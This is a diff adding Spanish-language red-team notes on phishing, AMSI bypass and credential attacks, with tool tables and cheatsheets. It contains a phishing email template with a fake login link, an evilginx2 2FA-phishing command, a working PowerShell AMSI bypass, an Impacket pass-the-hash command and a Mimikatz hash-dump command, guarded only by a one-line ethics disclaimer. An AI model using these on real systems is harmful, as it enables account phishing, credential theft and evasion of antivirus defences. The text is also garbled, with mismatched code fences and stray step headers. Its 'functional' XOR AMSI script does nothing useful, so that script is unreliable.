@@ -1,0 +1,79 @@
+# 🎣 Táctica: Phishing (MITRE ATT&CK T1566)
+
+## 🔍 Descripción
+Técnicas para ganar acceso inicial mediante engaño, incluyendo plantillas de correo y servidores C2.
+
+## 🛠 Herramientas Recomendadas
+| Herramienta | Uso | Ejemplo |
+|-------------|-----|---------|
+| **GoPhish** | Plataforma de phishing | [Guía rápida](https://getgophish.com/docs) |
+| **Evilginx2** | Phishing de 2FA | `evilginx2 setup -d portal.office365.fake.com` |
+
+## 📌 Ejemplo Práctico
+### Plantilla de Correo (Actualización de HR)
+```html
+<a href="http://fake-login.com/hr-update">Haz clic para revisar tu nuevo bono</a>
+```
+> ⚠️ **Ética**: Solo usar en entornos autorizados.
+```
+
+#### 2. **`/Defense-Evasion/AMSI-Bypass.md`**:
+```markdown
+# 🛡️ AMSI Bypass (MITRE ATT&CK T1562.001)
+
+## 🔥 Técnicas 2024
+1. **Patch en memoria (PowerShell)**:
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+2. **Obfuscación con XOR**: [Ver script](Tools/Scripts/AMSI-Bypass.ps1).
+
+## 🎯 Detección
+- Monitorear `EventID 4688` en Windows.
+```
+
+#### 3. **`/Resources/Cheatsheets.md`**:
+```markdown
+# 📚 Cheatsheets Rápidas
+
+## Impacket
+```bash
+# Pass-The-Hash con wmiexec.py
+python3 wmiexec.py -hashes LMHASH:NTHASH DOMAIN/USER@TARGET_IP
+```
+
+## Mimikatz
+```cmd
+# Extraer hashes de memoria
+sekurlsa::logonpasswords
+```
+```
+
+---
+
+### 🛠️ **Paso 3: Añadir Scripts de Ejemplo**
+#### 1. **`/Tools/Scripts/AMSI-Bypass.ps1`**:
+```powershell
+<#
+.SYNOPSIS
+    Bypass AMSI via XOR obfuscation (2024)
+.DESCRIPTION
+    Ejemplo funcional para entornos de prueba.
+#>
+
+$xorKey = 0x12
+$amsiBuffer = [System.Text.Encoding]::UTF8.GetBytes("amsiInitFailed")
+for ($i = 0; $i -lt $amsiBuffer.Length; $i++) {
+    $amsiBuffer[$i] = $amsiBuffer[$i] -bxor $xorKey
+}
+```
+
+#### 2. **`/Tools/RedTeam-Tools.md`**:
+```markdown
+# 🧰 Herramientas Esenciales
+
+| Categoría       | Herramienta       | Enlace                          |
+|-----------------|-------------------|---------------------------------|
+| C2 Framework    | **Covenant**      | https://github.com/cobbr/Covenant |
+| Lateral Movement| **Impacket**      | https://github.com/fortra/impacket |
+```
